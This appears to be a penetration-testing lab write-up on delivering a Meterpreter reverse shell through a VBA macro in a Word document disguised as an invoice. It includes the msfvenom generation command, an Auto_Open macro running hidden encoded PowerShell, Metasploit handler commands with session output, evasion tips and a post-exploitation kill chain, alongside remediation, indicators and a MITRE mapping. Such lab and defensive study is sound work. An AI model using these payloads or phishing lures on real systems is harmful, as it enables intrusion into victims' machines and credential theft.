> **English** | [Italiano](README.md)

# Malicious Macros - VBA Reverse Shell via Office Document

> - **Phase:** Social Engineering - Payload Delivery via VBA Macro
> - **Visibility:** High - VBA macros are monitored by AV/EDR, AMSI inspects PowerShell code at runtime, documents with macros trigger SIEM alerts; files with MotW trigger the default macro block on Office 2022+
> - **Prerequisites:** msfvenom for VBA-PSH payload generation; Microsoft Office installed on target with macros enabled (or MotW removed); Metasploit handler listening; basic VBA knowledge for customization
> - **Output:** SE-007 (VBA macro executes PowerShell stager for Meterpreter reverse shell - severity High)

- **Operating Environment:** Kali Linux Purple (Attacker), Windows 10 VM with Office 2019 (Victim)
- **Target:** Simulated corporate user opening a Word document
- **Framework:** msfvenom (payload generation), Metasploit (handler)
- **Documented Techniques:** VBA Macro Execution, PowerShell Stager, Reverse Shell Callback

---

## Executive Summary

VBA (Visual Basic for Applications) macros in Microsoft Office documents represent the most widely used delivery vector in cybercrime history, dominating the threat landscape from 2015 to 2022. The principle is simple: a Word/Excel document contains VBA code that, when the user clicks "Enable Content", executes arbitrary commands on the system. In the lab, the macro generates an encoded PowerShell stager that establishes a Meterpreter reverse shell back to the attacker.

Microsoft introduced the default macro block for files with Mark-of-the-Web (July 2022), drastically reducing the effectiveness of this technique for files downloaded from the Internet. However, the technique remains relevant in specific scenarios: files originating from internal SMB shares (without MotW), environments with permissive macro policies, and organizations with legacy dependencies on macro-enabled documents.

---

## VBA Macro: PowerShell Stager for Reverse Shell

**Finding ID:** `SE-007` | **Severity:** `High`

### Operational Context

The scenario simulates a typical attack: a Word document disguised as a corporate invoice ("Fattura_Q1_2026.docm") is sent to the target via email. Upon opening, Office displays the "Enable Content" banner. If the user clicks it, the VBA macro executes, launches a PowerShell stager in the background, and establishes a reverse TCP connection to the attacker.

### PoC - Phase 1: VBA Payload Generation

```Bash
# VBA macro generation with PowerShell stager
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f vba-psh -o macro_payload.vba
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes                                     <-- compact payload
Final size of vba-psh file: 7812 bytes                      <-- generated VBA code
Saved as: macro_payload.vba
```

### PoC - Phase 2: Embedding in Word Document

```Bash
# The contents of macro_payload.vba must be copied into the Word VBA editor:
# 1. Open Word -> New document
# 2. Alt+F11 -> VBA Editor
# 3. Insert -> Module -> paste the code from macro_payload.vba
# 4. The Auto_Open() function executes automatically on document open
# 5. Save as .docm (macro-enabled) -> "Fattura_Q1_2026.docm"
```

```vb
' Simplified extract of the generated macro (Auto_Open)
Sub Auto_Open()
    Dim cmd As String
    cmd = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AI..."
    Shell cmd, vbHide           ' Hidden execution
End Sub
```

### PoC - Phase 3: Handler Setup and Callback

```Bash
# Metasploit handler (Kali)
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.110
set LPORT 4444
run
```

```
[*] Started reverse TCP handler on 192.168.0.110:4444
[*] Sending stage (201798 bytes) to 192.168.0.120
[*] Meterpreter session 1 opened (192.168.0.110:4444 -> 192.168.0.120:49712)    <-- SE-007

meterpreter > getuid
Server username: DESKTOP-LAB\mario.rossi                    <-- victim identity
meterpreter > sysinfo
Computer    : DESKTOP-LAB
OS          : Windows 10 (10.0 Build 19045)
Meterpreter : x64/windows
```

### Remediation

- **Immediate action:** isolate the compromised machine from the network; kill the malicious PowerShell process; run a full AV scan; check for additional artifacts (persistence, lateral movement)
- **Structural action:** block VBA macros via Group Policy (`Block macros from running in Office files from the Internet`); deploy Attack Surface Reduction (ASR) rules: `Block Office applications from creating executable content` and `Block Office applications from injecting code into other processes`; enable AMSI (Antimalware Scan Interface) for runtime PowerShell inspection; configure email gateway for stripping .docm/.xlsm attachments or sandboxing
- **Verification:** send a test .docm document - it must be blocked by the MotW banner with no "Enable Content" option available; verify AMSI logs for PowerShell stager detection

---

## Lab Experience

The environment was configured with Office 2019 on a Windows 10 VM with macros enabled via local GPO to simulate a legacy corporate environment. The first attempt used the raw `vba-psh` payload from msfvenom, which was immediately detected by Windows Defender with the signature `Trojan:Script/Wacatac.B!ml`. The solution was to disable Defender to complete the PoC (in a real engagement, obfuscation with `macro_pack` or custom encoding would be used).

A critical aspect that emerged during testing: the VBA payload generated by msfvenom contains Base64-encoded PowerShell strings that exceed the 255-character-per-line VBA limit. msfvenom handles this automatically by splitting strings into concatenations, but the total VBA module size (approximately 8 KB) may raise suspicion from an analyst manually inspecting the document.

The decision to use `Auto_Open()` instead of `Document_Open()` was driven by compatibility: `Auto_Open` executes in both .docm documents and .dotm templates, while `Document_Open` specifically requires a document (not a template). In a real-world scenario, `Document_Open` would be used to avoid accidental execution during development.

---

## Theoretical Analysis: Rise and Fall of VBA Macros

VBA macros dominated the threat landscape for a structural reason: Microsoft Office is installed on over 90% of corporate computers, and the VBA language has full access to Windows APIs through `Shell()`, `CreateObject("WScript.Shell")`, and `Declare` statements. This means that an Office document is, in effect, a container for arbitrary executable code.

The turning point was July 2022, when Microsoft began blocking VBA macros in files with Mark-of-the-Web (MotW) - the NTFS flag (`Zone.Identifier` alternate data stream) that Windows applies to files downloaded from the Internet. With MotW present, Office displays a red banner without the "Enable Content" button, making macro execution impossible.

This decision had an immediate and measurable impact: according to Proofpoint data, the use of VBA macros as a delivery vector decreased by 66% in the 6 months following enforcement. Attackers shifted to vectors that bypass MotW (ISO, LNK, container files) or that are not affected by it (HTML Smuggling). However, VBA macros remain an active vector in the following scenarios:
- Files originating from internal SMB/DFS shares (they do not have MotW)
- Organizations with GPO policies that re-enable macros ("Trust access to the VBA project object model")
- .doc documents (legacy OLE format) that in some configurations do not trigger the block

---

## Real-World Scenario: Post-Exploitation Projection

> This section describes how this finding would fit into a real engagement.

### Attacker Perspective (Red Team)

**Starting point:** Meterpreter reverse shell as standard user `mario.rossi` (SE-007).

**Projected kill chain:**

```
[SE-007] Macro executed -> Meterpreter session (standard user)
        |
        v
Process migration -> explorer.exe (persistence beyond document restart)
        |
        v
Privilege Escalation -> WinPEAS/PrintSpoofer (from 04-system-exploitation)
        |
        v
Credential Dumping -> Mimikatz/SAM dump -> NTLM hashes
        |
        v
Lateral Movement -> Pass-the-Hash / PsExec to other hosts
```

### Defender Perspective (Blue Team)

**IOCs to monitor:**
- `powershell.exe` process as child of `WINWORD.EXE` (anomalous parent-child correlation)
- Outbound TCP connection from Office process to external IP
- Event ID 4688 (Process Creation) with Base64-encoded command line
- AMSI event: `ScriptBlockLogging` with suspicious content

**Hardening:**
- ASR rule: `Block Office applications from creating child processes`
- PowerShell Constrained Language Mode via AppLocker/WDAC
- Script Block Logging enabled for PowerShell audit

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | VBA macro generation with PowerShell stager via msfvenom |
| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | Malicious Word document sent as "Fattura_Q1_2026.docm" |
| Execution | User Execution: Malicious File | `T1204.002` | User opens document and clicks "Enable Content" (SE-007) |
| Execution | Command and Scripting Interpreter: Visual Basic | `T1059.005` | VBA macro Auto_Open() executes the payload |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Encoded PowerShell stager establishes reverse shell |
| Defense Evasion | Obfuscated Files or Information | `T1027` | Base64-encoded PowerShell payload for static signature evasion |
| Command and Control | Non-Standard Port | `T1571` | Reverse TCP Meterpreter on port 4444 |

---

> **Note:** All documented activities were conducted in a virtualized lab environment. Malicious documents were created and tested exclusively on virtual machines owned by the author. No documents were sent to real people.
